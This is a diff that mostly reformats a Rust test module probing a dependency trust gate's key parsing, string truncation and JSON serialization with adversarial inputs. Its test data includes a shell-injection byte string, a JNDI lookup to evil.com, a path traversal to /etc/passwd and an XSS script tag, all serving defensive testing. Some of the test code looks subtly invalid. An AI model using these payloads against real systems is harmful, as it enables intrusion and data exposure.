@@ -18728,14 +18728,24 @@ mod run_trust_gate_tests {
         fn test_signing_key_parsing_injection_and_format_attacks() {
             // Attack 1: Binary injection attempts in signing key data
             let binary_injection_attacks = vec![
-                vec![0x00; 32],                    // All null bytes
-                vec![0xFF; 32],                    // All ones
+                vec![0x00; 32],                         // All null bytes
+                vec![0xFF; 32],                         // All ones
                 vec![0xDE, 0xAD, 0xBE, 0xEF].repeat(8), // Repeated patterns
-                (0..32).collect::<Vec<u8>>(),      // Sequential bytes
-                vec![0x80; 32],                    // High bit set
-                vec![0x7F; 32],                    // ASCII DEL
-                b"\x1b[31mINJECTION\x1b[0m".to_vec().into_iter().cycle().take(32).collect(), // ANSI escape codes
-                b"#!/bin/sh\necho pwned".to_vec().into_iter().cycle().take(32).collect(), // Shell injection
+                (0..32).collect::<Vec<u8>>(),           // Sequential bytes
+                vec![0x80; 32],                         // High bit set
+                vec![0x7F; 32],                         // ASCII DEL
+                b"\x1b[31mINJECTION\x1b[0m"
+                    .to_vec()
+                    .into_iter()
+                    .cycle()
+                    .take(32)
+                    .collect(), // ANSI escape codes
+                b"#!/bin/sh\necho pwned"
+                    .to_vec()
+                    .into_iter()
+                    .cycle()
+                    .take(32)
+                    .collect(), // Shell injection
             ];
 
             for (i, attack_bytes) in binary_injection_attacks.iter().enumerate() {
@@ -18745,13 +18755,21 @@ mod run_trust_gate_tests {
                     Some(signing_key) => {
                         // If parsing succeeded, verify key is valid
                         let verifying_key = signing_key.verifying_key();
-                        assert_eq!(verifying_key.as_bytes().len(), 32,
-                                 "Parsed key {} should have 32-byte verifying key", i);
+                        assert_eq!(
+                            verifying_key.as_bytes().len(),
+                            32,
+                            "Parsed key {} should have 32-byte verifying key",
+                            i
+                        );
 
                         // Verify no injection occurred by checking key derivation
                         let expected_key = ed25519_dalek::SigningKey::from_bytes(attack_bytes);
-                        assert_eq!(signing_key.to_bytes(), expected_key.to_bytes(),
-                                 "Attack {} should produce expected key if valid", i);
+                        assert_eq!(
+                            signing_key.to_bytes(),
+                            expected_key.to_bytes(),
+                            "Attack {} should produce expected key if valid",
+                            i
+                        );
                     }
                     None => {
                         // Rejection is acceptable for malformed keys
@@ -18761,15 +18779,15 @@ mod run_trust_gate_tests {
 
             // Attack 2: Hex encoding manipulation and injection
             let hex_injection_attacks = vec![
-                "0x",                              // Empty hex
-                "0x4",                             // Single hex digit
-                "0x" + &"g".repeat(64),           // Invalid hex characters
-                "0x" + &"41".repeat(32) + "INJECTION", // Valid hex + injection
-                "0X" + &"42".repeat(32),          // Uppercase prefix
-                "0x" + &"43_44_45".repeat(10) + "46", // Underscores
-                "0x" + &"47:48:49".repeat(10) + "4a", // Colons
-                "0x" + &"4b-4c-4d".repeat(10) + "4e", // Hyphens
-                &"4f".repeat(32),                 // No prefix
+                "0x",                                   // Empty hex
+                "0x4",                                  // Single hex digit
+                "0x" + &"g".repeat(64),                 // Invalid hex characters
+                "0x" + &"41".repeat(32) + "INJECTION",  // Valid hex + injection
+                "0X" + &"42".repeat(32),                // Uppercase prefix
+                "0x" + &"43_44_45".repeat(10) + "46",   // Underscores
+                "0x" + &"47:48:49".repeat(10) + "4a",   // Colons
+                "0x" + &"4b-4c-4d".repeat(10) + "4e",   // Hyphens
+                &"4f".repeat(32),                       // No prefix
                 "0x" + &"50\n51\t52".repeat(10) + "53", // Control chars
             ];
 
@@ -18778,8 +18796,12 @@ mod run_trust_gate_tests {
 
                 // System should either parse validly or reject safely
                 if let Some(signing_key) = parse_result {
-                    assert_eq!(signing_key.to_bytes().len(), 32,
-                             "Hex attack '{}' should produce valid 32-byte key", hex_attack);
+                    assert_eq!(
+                        signing_key.to_bytes().len(),
+                        32,
+                        "Hex attack '{}' should produce valid 32-byte key",
+                        hex_attack
+                    );
                 }
             }
 
@@ -18788,16 +18810,16 @@ mod run_trust_gate_tests {
             let valid_b64 = base64::engine::general_purpose::STANDARD.encode(valid_key_bytes);
 
             let base64_attacks = vec![
-                valid_b64.clone(),                          // Valid base64
-                valid_b64.clone() + "INJECTION",           // Valid + injection
-                valid_b64.replace('+', '-'),               // Character substitution
-                valid_b64.replace('/', '_'),               // URL-safe variant
-                valid_b64.trim_end_matches('=').to_string(), // No padding
-                valid_b64 + "===",                         // Extra padding
-                "Z".repeat(44),                            // All same character
-                "AAAA".repeat(11),                         // Repeated pattern
-                valid_b64.to_lowercase(),                  // Case change
-                valid_b64.to_uppercase(),                  // Case change
+                valid_b64.clone(),                                     // Valid base64
+                valid_b64.clone() + "INJECTION",                       // Valid + injection
+                valid_b64.replace('+', '-'),                           // Character substitution
+                valid_b64.replace('/', '_'),                           // URL-safe variant
+                valid_b64.trim_end_matches('=').to_string(),           // No padding
+                valid_b64 + "===",                                     // Extra padding
+                "Z".repeat(44),                                        // All same character
+                "AAAA".repeat(11),                                     // Repeated pattern
+                valid_b64.to_lowercase(),                              // Case change
+                valid_b64.to_uppercase(),                              // Case change
                 format!("{}\n{}", &valid_b64[..22], &valid_b64[22..]), // Newline split
             ];
 
@@ -18805,8 +18827,12 @@ mod run_trust_gate_tests {
                 let parse_result = parse_signing_key_from_blob(b64_attack.as_bytes());
 
                 if let Some(signing_key) = parse_result {
-                    assert_eq!(signing_key.to_bytes().len(), 32,
-                             "Base64 attack {} should produce valid key", i);
+                    assert_eq!(
+                        signing_key.to_bytes().len(),
+                        32,
+                        "Base64 attack {} should produce valid key",
+                        i
+                    );
                 }
             }
 
@@ -18819,12 +18845,25 @@ mod run_trust_gate_tests {
             valid_keypair[32..].copy_from_slice(&valid_verifying_key);
 
             let keypair_attacks = vec![
-                valid_keypair,                                    // Valid keypair
-                {let mut attack = valid_keypair; attack[32] ^= 1; attack}, // Corrupted verifying key
-                {let mut attack = [0u8; 64]; attack[..32].copy_from_slice(&valid_seed); attack}, // Zero verifying key
-                [0xFF; 64],                                      // All ones
-                [0x00; 64],                                      // All zeros
-                {let mut attack = [0u8; 64]; attack[..32].copy_from_slice(&[0x77; 32]); attack[32..].copy_from_slice(&[0x88; 32]); attack}, // Mismatched
+                valid_keypair, // Valid keypair
+                {
+                    let mut attack = valid_keypair;
+                    attack[32] ^= 1;
+                    attack
+                }, // Corrupted verifying key
+                {
+                    let mut attack = [0u8; 64];
+                    attack[..32].copy_from_slice(&valid_seed);
+                    attack
+                }, // Zero verifying key
+                [0xFF; 64],    // All ones
+                [0x00; 64],    // All zeros
+                {
+                    let mut attack = [0u8; 64];
+                    attack[..32].copy_from_slice(&[0x77; 32]);
+                    attack[32..].copy_from_slice(&[0x88; 32]);
+                    attack
+                }, // Mismatched
             ];
 
             for (i, keypair_bytes) in keypair_attacks.iter().enumerate() {
@@ -18833,13 +18872,20 @@ mod run_trust_gate_tests {
                 match parse_result {
                     Some(signing_key) => {
                         // If parsing succeeded, verify consistency
-                        assert_eq!(signing_key.to_bytes().len(), 32,
-                                 "Keypair attack {} should produce valid signing key", i);
+                        assert_eq!(
+                            signing_key.to_bytes().len(),
+                            32,
+                            "Keypair attack {} should produce valid signing key",
+                            i
+                        );
 
                         // For valid format, verify the keypair matches
                         if i == 0 {
-                            assert_eq!(signing_key.to_bytes(), valid_seed,
-                                     "Valid keypair should produce expected signing key");
+                            assert_eq!(
+                                signing_key.to_bytes(),
+                                valid_seed,
+                                "Valid keypair should produce expected signing key"
+                            );
                         }
                     }
                     None => {
@@ -18852,32 +18898,46 @@ mod run_trust_gate_tests {
             }
 
             // Attack 5: Format confusion and mixed encoding attacks
-            let format_confusion_attacks = vec![(
-                b"0x424344454647484950515253545556575859606162636465666768697071".to_vec(), "Hex format"
-            ), (
-                BASE64_STANDARD.encode([0x11; 32]).into_bytes(), "Base64 format"
-            ), (
-                [0x22; 32].to_vec(), "Raw bytes"
-            ), (
-                b"data:application/octet-stream;base64,".to_vec()
-                    .into_iter()
-                    .chain(BASE64_STANDARD.encode([0x33; 32]).into_bytes())
-                    .collect(), "Data URL"
-            ), (
-                b"-----BEGIN PRIVATE KEY-----\n".to_vec()
-                    .into_iter()
-                    .chain(BASE64_STANDARD.encode([0x44; 32]).into_bytes())
-                    .chain(b"\n-----END PRIVATE KEY-----".to_vec())
-                    .collect(), "PEM-like format"
-            )];
+            let format_confusion_attacks = vec![
+                (
+                    b"0x424344454647484950515253545556575859606162636465666768697071".to_vec(),
+                    "Hex format",
+                ),
+                (
+                    BASE64_STANDARD.encode([0x11; 32]).into_bytes(),
+                    "Base64 format",
+                ),
+                ([0x22; 32].to_vec(), "Raw bytes"),
+                (
+                    b"data:application/octet-stream;base64,"
+                        .to_vec()
+                        .into_iter()
+                        .chain(BASE64_STANDARD.encode([0x33; 32]).into_bytes())
+                        .collect(),
+                    "Data URL",
+                ),
+                (
+                    b"-----BEGIN PRIVATE KEY-----\n"
+                        .to_vec()
+                        .into_iter()
+                        .chain(BASE64_STANDARD.encode([0x44; 32]).into_bytes())
+                        .chain(b"\n-----END PRIVATE KEY-----".to_vec())
+                        .collect(),
+                    "PEM-like format",
+                ),
+            ];
 
             for (attack_data, description) in format_confusion_attacks {
                 let parse_result = parse_signing_key_from_blob(&attack_data);
 
                 // System should handle format confusion safely
                 if let Some(signing_key) = parse_result {
-                    assert_eq!(signing_key.to_bytes().len(), 32,
-                             "{} should produce valid key if parsed", description);
+                    assert_eq!(
+                        signing_key.to_bytes().len(),
+                        32,
+                        "{} should produce valid key if parsed",
+                        description
+                    );
                 } else {
                     // Rejection of complex formats is acceptable
                 }
@@ -18892,21 +18952,27 @@ mod run_trust_gate_tests {
             // Boundary values
             assert_eq!(api::utf8_prefix(test_string, 0), "");
             assert_eq!(api::utf8_prefix(test_string, 1), "H");
-            assert_eq!(api::utf8_prefix(test_string, test_string.chars().count()), test_string);
-            assert_eq!(api::utf8_prefix(test_string, test_string.chars().count() + 100), test_string);
+            assert_eq!(
+                api::utf8_prefix(test_string, test_string.chars().count()),
+                test_string
+            );
+            assert_eq!(
+                api::utf8_prefix(test_string, test_string.chars().count() + 100),
+                test_string
+            );
             assert_eq!(api::utf8_prefix(test_string, usize::MAX), test_string);
 
             // Attack 2: Unicode boundary attacks
             let unicode_attacks = vec![
-                ("café", 4, "café"),                    // Basic UTF-8
-                ("café", 3, "caf"),                     // Cut before accent
-                ("🦀🔒⚡", 2, "🦀🔒"),                    // Emoji boundary
-                ("🦀🔒⚡", 1, "🦀"),                     // Single emoji
-                ("\u{0041}\u{0300}", 1, "À"),          // Combining character (should handle gracefully)
-                ("Ελληνικά", 3, "Ελλ"),                // Greek text
-                ("中文测试", 2, "中文"),                 // Chinese characters
-                ("مرحبا", 2, "مر"),                     // Arabic text
-                ("𝕌𝕟𝕚𝕔𝕠𝕕𝕖", 2, "𝕌𝕟"),                 // Mathematical symbols
+                ("café", 4, "café"),                                    // Basic UTF-8
+                ("café", 3, "caf"),                                     // Cut before accent
+                ("🦀🔒⚡", 2, "🦀🔒"),                                  // Emoji boundary
+                ("🦀🔒⚡", 1, "🦀"),                                    // Single emoji
+                ("\u{0041}\u{0300}", 1, "À"), // Combining character (should handle gracefully)
+                ("Ελληνικά", 3, "Ελλ"),       // Greek text
+                ("中文测试", 2, "中文"),      // Chinese characters
+                ("مرحبا", 2, "مر"),           // Arabic text
+                ("𝕌𝕟𝕚𝕔𝕠𝕕𝕖", 2, "𝕌𝕟"),         // Mathematical symbols
                 ("test\u{200B}invisible", 5, "test\u{200B}"), // Zero-width space
                 ("direction\u{202E}override", 10, "direction\u{202E}"), // Text direction override
             ];
@@ -18915,32 +18981,45 @@ mod run_trust_gate_tests {
                 let result = api::utf8_prefix(input, max_chars);
 
                 // Should not panic and should handle UTF-8 correctly
-                assert!(result.len() <= input.len(),
-                       "Result should not be longer than input for '{}' with max {}", input, max_chars);
+                assert!(
+                    result.len() <= input.len(),
+                    "Result should not be longer than input for '{}' with max {}",
+                    input,
+                    max_chars
+                );
 
                 // Should be valid UTF-8
-                assert!(result.is_ascii() || std::str::from_utf8(result.as_bytes()).is_ok(),
-                       "Result should be valid UTF-8 for '{}' with max {}", input, max_chars);
+                assert!(
+                    result.is_ascii() || std::str::from_utf8(result.as_bytes()).is_ok(),
+                    "Result should be valid UTF-8 for '{}' with max {}",
+                    input,
+                    max_chars
+                );
 
                 // Character count should not exceed max_chars
-                assert!(result.chars().count() <= max_chars,
-                       "Character count should not exceed {} for '{}', got {} chars in '{}'",
-                       max_chars, input, result.chars().count(), result);
+                assert!(
+                    result.chars().count() <= max_chars,
+                    "Character count should not exceed {} for '{}', got {} chars in '{}'",
+                    max_chars,
+                    input,
+                    result.chars().count(),
+                    result
+                );
             }
 
             // Attack 3: Edge case string content
             let edge_case_strings = vec![
-                "",                                     // Empty string
-                "\0",                                   // Null byte
-                "\u{FEFF}",                            // BOM
-                "\n\r\t",                              // Control characters
-                " \t\n\r ",                            // Whitespace
-                "\x7F".repeat(10),                     // DEL characters
-                "\u{202A}\u{202B}\u{202C}",           // Text direction controls
-                "normal\u{0000}null",                 // Embedded null
-                "test\x1b[31mcolor\x1b[0m",           // ANSI escape sequences
-                "🦀".repeat(1000),                     // Large unicode
-                "a".repeat(100000),                    // Large ASCII
+                "",                         // Empty string
+                "\0",                       // Null byte
+                "\u{FEFF}",                 // BOM
+                "\n\r\t",                   // Control characters
+                " \t\n\r ",                 // Whitespace
+                "\x7F".repeat(10),          // DEL characters
+                "\u{202A}\u{202B}\u{202C}", // Text direction controls
+                "normal\u{0000}null",       // Embedded null
+                "test\x1b[31mcolor\x1b[0m", // ANSI escape sequences
+                "🦀".repeat(1000),          // Large unicode
+                "a".repeat(100000),         // Large ASCII
             ];
 
             for edge_string in edge_case_strings {
@@ -18948,14 +19027,19 @@ mod run_trust_gate_tests {
                     let result = api::utf8_prefix(edge_string, max_chars);
 
                     // Should not panic
-                    assert!(result.chars().count() <= max_chars,
-                           "Edge case '{}' with max {} should respect character limit",
-                           edge_string.escape_debug(), max_chars);
+                    assert!(
+                        result.chars().count() <= max_chars,
+                        "Edge case '{}' with max {} should respect character limit",
+                        edge_string.escape_debug(),
+                        max_chars
+                    );
 
                     // Should be valid prefix
-                    assert!(edge_string.starts_with(result),
-                           "Result should be prefix of input for edge case '{}'",
-                           edge_string.escape_debug());
+                    assert!(
+                        edge_string.starts_with(result),
+                        "Result should be prefix of input for edge case '{}'",
+                        edge_string.escape_debug()
+                    );
                 }
             }
 
@@ -18967,11 +19051,17 @@ mod run_trust_gate_tests {
                 let duration = start.elapsed();
 
                 // Should complete quickly (within reasonable time)
-                assert!(duration.as_millis() < 1000,
-                       "Large string processing should be fast, took {:?} for {} chars", duration, max_chars);
+                assert!(
+                    duration.as_millis() < 1000,
+                    "Large string processing should be fast, took {:?} for {} chars",
+                    duration,
+                    max_chars
+                );
 
-                assert!(result.chars().count() <= max_chars,
-                       "Large string should respect character limit");
+                assert!(
+                    result.chars().count() <= max_chars,
+                    "Large string should respect character limit"
+                );
             }
 
             // Attack 5: Integer overflow attempts
@@ -19014,10 +19104,14 @@ mod run_trust_gate_tests {
             let json_str = serialization_result.unwrap();
 
             // Verify JSON injection is properly escaped
-            assert!(!json_str.contains(r#""injection":"malicious""#),
-                   "JSON injection should be escaped in command field");
-            assert!(!json_str.contains(r#""evil_field":"injected_value""#),
-                   "JSON injection should be escaped in reason field");
+            assert!(
+                !json_str.contains(r#""injection":"malicious""#),
+                "JSON injection should be escaped in command field"
+            );
+            assert!(
+                !json_str.contains(r#""evil_field":"injected_value""#),
+                "JSON injection should be escaped in reason field"
+            );
 
             // Attack 2: RunDependencyTrustResult with malicious content
             let malicious_dependency = RunDependencyTrustResult {
@@ -19032,17 +19126,26 @@ mod run_trust_gate_tests {
             };
 
             let dep_serialization = serde_json::to_string(&malicious_dependency);
-            assert!(dep_serialization.is_ok(), "Malicious dependency should serialize safely");
+            assert!(
+                dep_serialization.is_ok(),
+                "Malicious dependency should serialize safely"
+            );
 
             let dep_json = dep_serialization.unwrap();
 
             // Verify malicious content is preserved but escaped
-            assert!(dep_json.contains("../../../etc/passwd"),
-                   "Path traversal should be preserved as string");
-            assert!(dep_json.contains("${jndi:ldap://evil.com}"),
-                   "JNDI injection should be preserved as string");
-            assert!(dep_json.contains("<script>alert('xss')</script>"),
-                   "XSS attempt should be preserved as string");
+            assert!(
+                dep_json.contains("../../../etc/passwd"),
+                "Path traversal should be preserved as string"
+            );
+            assert!(
+                dep_json.contains("${jndi:ldap://evil.com}"),
+                "JNDI injection should be preserved as string"
+            );
+            assert!(
+                dep_json.contains("<script>alert('xss')</script>"),
+                "XSS attempt should be preserved as string"
+            );
 
             // Attack 3: TrustScanReport with extreme values
             let extreme_scan_report = TrustScanReport {
@@ -19060,25 +19163,37 @@ mod run_trust_gate_tests {
                     "🦀".repeat(1000),
                     String::from_utf8_lossy(&[0x00, 0x01, 0xFF]).repeat(100),
                 ],
-                items: (0..10000).map(|i| TrustScanItem {
-                    dependency_name: format!("package_{}", i),
-                    section: "deps".to_string(),
-                    extension_id: format!("ext_{}", i),
-                    extension_version: format!("v{}.{}.{}", i/100, i/10 % 10, i % 10),
-                    status: if i % 2 == 0 { TrustScanItemStatus::Created } else { TrustScanItemStatus::SkippedExisting },
-                    publisher_id: format!("publisher_{}", i % 100),
-                    risk_level: if i % 3 == 0 { "HIGH" } else { "LOW" }.to_string(),
-                    integrity_hash_count: i % 20,
-                    vulnerability_count: i % 5,
-                    dependent_count: Some(i as u64),
-                }).collect(),
+                items: (0..10000)
+                    .map(|i| TrustScanItem {
+                        dependency_name: format!("package_{}", i),
+                        section: "deps".to_string(),
+                        extension_id: format!("ext_{}", i),
+                        extension_version: format!("v{}.{}.{}", i / 100, i / 10 % 10, i % 10),
+                        status: if i % 2 == 0 {
+                            TrustScanItemStatus::Created
+                        } else {
+                            TrustScanItemStatus::SkippedExisting
+                        },
+                        publisher_id: format!("publisher_{}", i % 100),
+                        risk_level: if i % 3 == 0 { "HIGH" } else { "LOW" }.to_string(),
+                        integrity_hash_count: i % 20,
+                        vulnerability_count: i % 5,
+                        dependent_count: Some(i as u64),
+                    })
+                    .collect(),
             };
 
             let extreme_serialization = serde_json::to_string(&extreme_scan_report);
-            assert!(extreme_serialization.is_ok(), "Extreme values should serialize");
+            assert!(
+                extreme_serialization.is_ok(),
+                "Extreme values should serialize"
+            );
 
             let extreme_json = extreme_serialization.unwrap();
-            assert!(!extreme_json.is_empty(), "Extreme serialization should produce output");
+            assert!(
+                !extreme_json.is_empty(),
+                "Extreme serialization should produce output"
+            );
 
             // Attack 4: Ed25519SigningMaterial path manipulation
             let malicious_paths = vec![
@@ -19102,10 +19217,16 @@ mod run_trust_gate_tests {
                 };
 
                 // Should handle malicious paths safely
-                assert_eq!(signing_material.path, *malicious_path,
-                          "Path should be preserved for attack {}", i);
-                assert_eq!(signing_material.source, "test",
-                          "Source should be preserved for attack {}", i);
+                assert_eq!(
+                    signing_material.path, *malicious_path,
+                    "Path should be preserved for attack {}",
+                    i
+                );
+                assert_eq!(
+                    signing_material.source, "test",
+                    "Source should be preserved for attack {}",
+                    i
+                );
             }
 
             // Attack 5: RunPackageDependency field injection
@@ -19117,13 +19238,13 @@ mod run_trust_gate_tests {
                     extension_id: "normal-ext".to_string(),
                 },
                 RunPackageDependency {
-                    dependency_name: "".to_string(),  // Empty name
+                    dependency_name: "".to_string(), // Empty name
                     version_requirement: "".to_string(),
                     section: "".to_string(),
                     extension_id: "".to_string(),
                 },
                 RunPackageDependency {
-                    dependency_name: "\n\r\t".to_string(),  // Control characters
+                    dependency_name: "\n\r\t".to_string(), // Control characters
                     version_requirement: ">=0.0.0, <999.999.999".to_string(),
                     section: "dev-dependencies".to_string(),
                     extension_id: "control-chars-ext".to_string(),
@@ -19138,12 +19259,21 @@ mod run_trust_gate_tests {
 
             for (i, dependency) in dependency_injections.iter().enumerate() {
                 let dep_serialization = serde_json::to_string(dependency);
-                assert!(dep_serialization.is_ok(),
-                       "Dependency injection {} should serialize", i);
+                assert!(
+                    dep_serialization.is_ok(),
+                    "Dependency injection {} should serialize",
+                    i
+                );
 
                 // Verify structure is preserved
-                assert_eq!(dependency.dependency_name, dependency_injections[i].dependency_name);
-                assert_eq!(dependency.version_requirement, dependency_injections[i].version_requirement);
+                assert_eq!(
+                    dependency.dependency_name,
+                    dependency_injections[i].dependency_name
+                );
+                assert_eq!(
+                    dependency.version_requirement,
+                    dependency_injections[i].version_requirement
+                );
             }
         }
 
@@ -19159,17 +19289,25 @@ mod run_trust_gate_tests {
 
             for status in trust_statuses {
                 let serialization_result = serde_json::to_string(&status);
-                assert!(serialization_result.is_ok(),
-                       "Trust status {:?} should serialize", status);
+                assert!(
+                    serialization_result.is_ok(),
+                    "Trust status {:?} should serialize",
+                    status
+                );
 
                 let json_str = serialization_result.unwrap();
-                let deserialization_result: Result<RunDependencyTrustStatus, _> = serde_json::from_str(&json_str);
-                assert!(deserialization_result.is_ok(),
-                       "Trust status should round-trip serialize/deserialize");
+                let deserialization_result: Result<RunDependencyTrustStatus, _> =
+                    serde_json::from_str(&json_str);
+                assert!(
+                    deserialization_result.is_ok(),
+                    "Trust status should round-trip serialize/deserialize"
+                );
 
                 let deserialized = deserialization_result.unwrap();
-                assert_eq!(status, deserialized,
-                          "Round-trip should preserve trust status");
+                assert_eq!(
+                    status, deserialized,
+                    "Round-trip should preserve trust status"
+                );
             }
 
             // Attack 2: TrustScanItemStatus variant manipulation
@@ -19180,19 +19318,26 @@ mod run_trust_gate_tests {
 
             for status in scan_statuses {
                 let serialization_result = serde_json::to_string(&status);
-                assert!(serialization_result.is_ok(),
-                       "Scan status {:?} should serialize", status);
+                assert!(
+                    serialization_result.is_ok(),
+                    "Scan status {:?} should serialize",
+                    status
+                );
 
                 // Verify snake_case serialization
                 let json_str = serialization_result.unwrap();
                 match status {
                     TrustScanItemStatus::Created => {
-                        assert!(json_str.contains("created"),
-                               "Created status should serialize as 'created'");
+                        assert!(
+                            json_str.contains("created"),
+                            "Created status should serialize as 'created'"
+                        );
                     }
                     TrustScanItemStatus::SkippedExisting => {
-                        assert!(json_str.contains("skipped_existing"),
-                               "SkippedExisting should serialize as 'skipped_existing'");
+                        assert!(
+                            json_str.contains("skipped_existing"),
+                            "SkippedExisting should serialize as 'skipped_existing'"
+                        );
                     }
                 }
             }
@@ -19200,32 +19345,40 @@ mod run_trust_gate_tests {
             // Attack 3: Invalid enum variant injection through JSON
             let invalid_trust_status_jsons = vec![
                 r#""unknown""#,
-                r#""TRUSTED""#,  // Wrong case
+                r#""TRUSTED""#, // Wrong case
                 r#""trusted_but_suspicious""#,
                 r#"null"#,
-                r#""""#,  // Empty string
+                r#""""#, // Empty string
                 r#""malicious_variant""#,
-                r#"42"#,  // Number instead of string
-                r#"{"variant": "trusted"}"#,  // Object instead of string
+                r#"42"#,                     // Number instead of string
+                r#"{"variant": "trusted"}"#, // Object instead of string
             ];
 
             for invalid_json in invalid_trust_status_jsons {
-                let parse_result: Result<RunDependencyTrustStatus, _> = serde_json::from_str(invalid_json);
-                assert!(parse_result.is_err(),
-                       "Invalid trust status JSON '{}' should fail to parse", invalid_json);
+                let parse_result: Result<RunDependencyTrustStatus, _> =
+                    serde_json::from_str(invalid_json);
+                assert!(
+                    parse_result.is_err(),
+                    "Invalid trust status JSON '{}' should fail to parse",
+                    invalid_json
+                );
             }
 
             let invalid_scan_status_jsons = vec![
                 r#""pending""#,
-                r#""Created""#,  // Wrong case
+                r#""Created""#, // Wrong case
                 r#""created_with_errors""#,
-                r#"[]"#,  // Array instead of string
+                r#"[]"#, // Array instead of string
             ];
 
             for invalid_json in invalid_scan_status_jsons {
-                let parse_result: Result<TrustScanItemStatus, _> = serde_json::from_str(invalid_json);
-                assert!(parse_result.is_err(),
-                       "Invalid scan status JSON '{}' should fail to parse", invalid_json);
+                let parse_result: Result<TrustScanItemStatus, _> =
+                    serde_json::from_str(invalid_json);
+                assert!(
+                    parse_result.is_err(),
+                    "Invalid scan status JSON '{}' should fail to parse",
+                    invalid_json
+                );
             }
 
             // Attack 4: Enum variant boundary testing in complex structures
@@ -19258,49 +19411,68 @@ mod run_trust_gate_tests {
 
             for (i, item) in boundary_test_items.iter().enumerate() {
                 let serialization_result = serde_json::to_string(item);
-                assert!(serialization_result.is_ok(),
-                       "Boundary test item {} should serialize", i);
+                assert!(
+                    serialization_result.is_ok(),
+                    "Boundary test item {} should serialize",
+                    i
+                );
 
                 let json_str = serialization_result.unwrap();
-                let deserialization_result: Result<TrustScanItem, _> = serde_json::from_str(&json_str);
-                assert!(deserialization_result.is_ok(),
-                       "Boundary test item {} should deserialize", i);
+                let deserialization_result: Result<TrustScanItem, _> =
+                    serde_json::from_str(&json_str);
+                assert!(
+                    deserialization_result.is_ok(),
+                    "Boundary test item {} should deserialize",
+                    i
+                );
 
                 let deserialized = deserialization_result.unwrap();
-                assert_eq!(item.status, deserialized.status,
-                          "Enum status should be preserved in boundary test {}", i);
+                assert_eq!(
+                    item.status, deserialized.status,
+                    "Enum status should be preserved in boundary test {}",
+                    i
+                );
             }
 
             // Attack 5: Concurrent enum access simulation
-            let concurrent_operations: Vec<_> = (0..1000).map(|i| {
-                let status = match i % 4 {
-                    0 => RunDependencyTrustStatus::Trusted,
-                    1 => RunDependencyTrustStatus::Untracked,
-                    2 => RunDependencyTrustStatus::Revoked,
-                    _ => RunDependencyTrustStatus::Quarantined,
-                };
+            let concurrent_operations: Vec<_> = (0..1000)
+                .map(|i| {
+                    let status = match i % 4 {
+                        0 => RunDependencyTrustStatus::Trusted,
+                        1 => RunDependencyTrustStatus::Untracked,
+                        2 => RunDependencyTrustStatus::Revoked,
+                        _ => RunDependencyTrustStatus::Quarantined,
+                    };
 
-                let scan_status = if i % 2 == 0 {
-                    TrustScanItemStatus::Created
-                } else {
-                    TrustScanItemStatus::SkippedExisting
-                };
+                    let scan_status = if i % 2 == 0 {
+                        TrustScanItemStatus::Created
+                    } else {
+                        TrustScanItemStatus::SkippedExisting
+                    };
 
-                (status, scan_status)
-            }).collect();
+                    (status, scan_status)
+                })
+                .collect();
 
             // Simulate rapid serialization/deserialization
             for (i, (trust_status, scan_status)) in concurrent_operations.iter().enumerate() {
                 let trust_json = serde_json::to_string(trust_status).unwrap();
                 let scan_json = serde_json::to_string(scan_status).unwrap();
 
-                let trust_parsed: RunDependencyTrustStatus = serde_json::from_str(&trust_json).unwrap();
+                let trust_parsed: RunDependencyTrustStatus =
+                    serde_json::from_str(&trust_json).unwrap();
                 let scan_parsed: TrustScanItemStatus = serde_json::from_str(&scan_json).unwrap();
 
-                assert_eq!(*trust_status, trust_parsed,
-                          "Concurrent operation {} should preserve trust status", i);
-                assert_eq!(*scan_status, scan_parsed,
-                          "Concurrent operation {} should preserve scan status", i);
+                assert_eq!(
+                    *trust_status, trust_parsed,
+                    "Concurrent operation {} should preserve trust status",
+                    i
+                );
+                assert_eq!(
+                    *scan_status, scan_parsed,
+                    "Concurrent operation {} should preserve scan status",
+                    i
+                );
             }
         }
 
@@ -19364,19 +19536,28 @@ mod run_trust_gate_tests {
                 match decode_result {
                     Ok(decoded) => {
                         // If decoding succeeded, verify it's reasonable
-                        assert!(decoded.len() <= hex_input.len(),
-                               "{} should not decode to longer data", description);
+                        assert!(
+                            decoded.len() <= hex_input.len(),
+                            "{} should not decode to longer data",
+                            description
+                        );
 
                         // Re-encode should be consistent (modulo case/formatting)
                         let re_encoded = hex::encode(&decoded);
-                        let normalized_original = hex_input.chars()
+                        let normalized_original = hex_input
+                            .chars()
                             .filter(|c| c.is_ascii_hexdigit())
                             .collect::<String>()
                             .to_lowercase();
 
-                        if hex_input.len() % 2 == 0 && hex_input.chars().all(|c| c.is_ascii_hexdigit()) {
-                            assert_eq!(re_encoded, normalized_original,
-                                     "{} should round-trip consistently", description);
+                        if hex_input.len() % 2 == 0
+                            && hex_input.chars().all(|c| c.is_ascii_hexdigit())
+                        {
+                            assert_eq!(
+                                re_encoded, normalized_original,
+                                "{} should round-trip consistently",
+                                description
+                            );
                         }
                     }
                     Err(_) => {
@@ -19413,13 +19594,19 @@ mod run_trust_gate_tests {
                             let re_encoded = engine.encode(&decoded);
 
                             // For padding engines, verify padding behavior
-                            if matches!(engine, base64::engine::general_purpose::STANDARD |
-                                              base64::engine::general_purpose::URL_SAFE) {
+                            if matches!(
+                                engine,
+                                base64::engine::general_purpose::STANDARD
+                                    | base64::engine::general_purpose::URL_SAFE
+                            ) {
                                 // Should include proper padding
                                 let expected_padding = (4 - (decoded.len() * 4 / 3) % 4) % 4;
-                                assert_eq!(re_encoded.chars().rev().take_while(|&c| c == '=').count(),
-                                          expected_padding,
-                                          "{} should have correct padding", description);
+                                assert_eq!(
+                                    re_encoded.chars().rev().take_while(|&c| c == '=').count(),
+                                    expected_padding,
+                                    "{} should have correct padding",
+                                    description
+                                );
                             }
                         }
                         Err(_) => {
@@ -19453,9 +19640,14 @@ mod run_trust_gate_tests {
                 // Base64 consistency across engines
                 for engine in &engines {
                     let b64_encoded = engine.encode(&test_data);
-                    let b64_decoded = engine.decode(&b64_encoded).expect("Base64 should round-trip");
-                    assert_eq!(test_data, b64_decoded,
-                             "Base64 encoding should be consistent for {:?}", engine);
+                    let b64_decoded = engine
+                        .decode(&b64_encoded)
+                        .expect("Base64 should round-trip");
+                    assert_eq!(
+                        test_data, b64_decoded,
+                        "Base64 encoding should be consistent for {:?}",
+                        engine
+                    );
                 }
             }
 
@@ -19470,8 +19662,11 @@ mod run_trust_gate_tests {
                 let hex_encoded = hex::encode(&large_data);
                 let hex_duration = start.elapsed();
 
-                assert!(hex_duration.as_millis() < 1000,
-                       "Hex encoding {} bytes should be fast", size);
+                assert!(
+                    hex_duration.as_millis() < 1000,
+                    "Hex encoding {} bytes should be fast",
+                    size
+                );
 
